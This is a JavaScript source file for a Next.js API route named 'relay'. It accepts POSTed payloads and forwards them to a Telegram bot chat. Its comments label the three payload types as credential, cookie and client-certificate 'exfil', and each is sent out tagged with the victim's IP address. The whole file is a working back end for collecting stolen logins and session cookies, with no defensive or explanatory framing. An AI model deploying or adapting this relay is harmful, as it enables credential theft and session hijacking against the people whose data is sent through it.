// pages/api/relay.js

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }

  try {
    const payload = req.body;
    const ip = payload.ip || 'unknown';

    // Telegram bot config
    const telegramToken = process.env.TELEGRAM_TOKEN;
    const chatId        = process.env.TELEGRAM_CHAT_ID;
    const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

    let text;

    // 1) Plain‐text credential exfil (legacy "data" field)
    if (typeof payload.data === 'string') {
      text = `🔑 Credentials from ${ip}:\n${payload.data}`;
    }
    // 2) JSON cookie exfil
    else if (Array.isArray(payload.cookies)) {
      const lines = payload.cookies.map(c => `• ${c.name} = ${c.value}`);
      text = `🍪 Cookies from ${ip}:\n` + lines.join('\n');
    }
    // 3) JSON cert exfil
    else if (payload.cert && typeof payload.cert === 'object') {
      text = 
        `🎫 Client Cert from ${ip}:\n` +
        `• Subject: ${payload.cert.subject}\n` +
        `• Issuer: ${payload.cert.issuer}\n` +
        `• Fingerprint: ${payload.cert.fingerprint}`;
    }
    else {
      // Unknown payload shape
      console.warn('relay: unknown payload', payload);
      return res.status(400).json({ success: false, message: 'Bad payload' });
    }

    // send to Telegram
    const telegramRes = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
      }),
    });

    if (!telegramRes.ok) {
      const errText = await telegramRes.text();
      console.error('Telegram API error:', errText);
      return res
        .status(502)
        .json({ success: false, message: 'Telegram API error', details: errText });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('relay handler error:', err);
    return res
      .status(500)
      .json({ success: false, message: 'Internal Server Error', error: err.message });
  }
}
